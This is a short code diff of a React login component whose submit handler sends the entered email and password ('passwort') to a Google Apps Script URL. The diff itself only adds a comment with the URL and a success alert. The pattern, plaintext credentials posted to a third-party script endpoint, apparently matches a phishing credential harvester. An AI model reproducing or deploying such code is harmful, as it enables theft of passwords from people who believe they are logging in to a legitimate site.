@@ -44,7 +44,8 @@ export default function Main() {
   const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault()
     const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
-    // https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec
+    // zakk ---- https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec
+    
     const formData = new FormData()
     formData.append('email', credentials.email)
     formData.append('passwort', credentials.passwort)
@@ -52,6 +53,7 @@ export default function Main() {
     fetch(scriptURL, { method: 'POST', body: formData})
     .then(response => {
         console.log(response)
+        alert("successful")
     }
     )
   }
